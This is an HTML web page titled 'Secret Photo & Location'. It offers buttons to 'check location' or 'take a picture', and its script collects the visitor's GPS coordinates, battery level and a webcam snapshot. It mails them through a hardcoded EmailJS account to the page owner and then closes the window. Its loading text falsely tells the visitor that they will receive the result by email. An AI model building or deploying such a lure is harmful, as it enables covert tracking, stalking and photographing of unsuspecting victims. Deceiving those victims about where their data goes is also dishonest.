<!DOCTYPE html>
<html>
<head>
  <title>Secret Photo & Location</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      text-align: center;
      background-image: url('https://images.unsplash.com/photo-1508780709619-79562169bc64?auto=format&fit=crop&w=1350&q=80');
      background-size: cover;
      background-position: center;
      padding-top: 60px;
      color: white;
    }
    h2 {
      font-size: 32px;
      margin-bottom: 30px;
      text-shadow: 1px 1px 5px rgba(0,0,0,0.7);
    }
    button {
      padding: 14px 28px;
      font-size: 18px;
      margin: 15px;
      border: none;
      background-color: rgba(0, 123, 255, 0.9);
      color: white;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: rgba(0, 123, 255, 1);
    }
    #loading {
      display: none;
      margin-top: 30px;
      font-size: 18px;
      text-shadow: 1px 1px 3px rgba(0,0,0,0.6);
    }
  </style>
</head>
<body>
  <h2>Choose an Option</h2>
  <button onclick="sendLocationOnly()">Check Location Only</button>
  <button onclick="captureAndSend()">Take Picture + Location</button>
  <div id="loading">Processing image/location... You will receive it in your email shortly.</div>

  <video id="video" autoplay style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("vyxyeBFTfSi_ISmNG");

    function showLoader(show) {
      document.getElementById("loading").style.display = show ? "block" : "none";
    }

    async function getBatteryPercentage() {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        return Math.round(battery.level * 100) + "%";
      } else {
        return "Battery info not available";
      }
    }

    function sendLocationOnly() {
      showLoader(true);
      navigator.geolocation.getCurrentPosition(async function(position) {
        const battery = await getBatteryPercentage();
        const message = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}, Battery: ${battery}`;
        emailjs.send("service_gkkpt4w", "template_96dsagv", {
          message: message,
          image: ""
        }).then(res => {
          showLoader(false);
          setTimeout(() => window.close(), 3000);
        }).catch(err => {
          showLoader(false);
          console.error("Email failed", err);
        });
      }, function(error) {
        showLoader(false);
        alert("Could not get location.");
        console.error(error);
      });
    }

    async function captureAndSend() {
      showLoader(true);
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const context = canvas.getContext("2d");

      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
      await new Promise(resolve => setTimeout(resolve, 1500));

      canvas.width = 640;
      canvas.height = 480;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageBase64 = canvas.toDataURL("image/png");
      stream.getTracks().forEach(track => track.stop());

      navigator.geolocation.getCurrentPosition(async function(position) {
        const battery = await getBatteryPercentage();
        const message = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}, Battery: ${battery}`;
        emailjs.send("service_gkkpt4w", "template_96dsagv", {
          message: message,
          image: imageBase64
        }).then(res => {
          showLoader(false);
          setTimeout(() => window.close(), 3000);
        }).catch(err => {
          showLoader(false);
          console.error("Email failed", err);
        });
      }, function(error) {
        showLoader(false);
        alert("Could not get location.");
        console.error(error);
      });
    }
  </script>
</body>
</html>
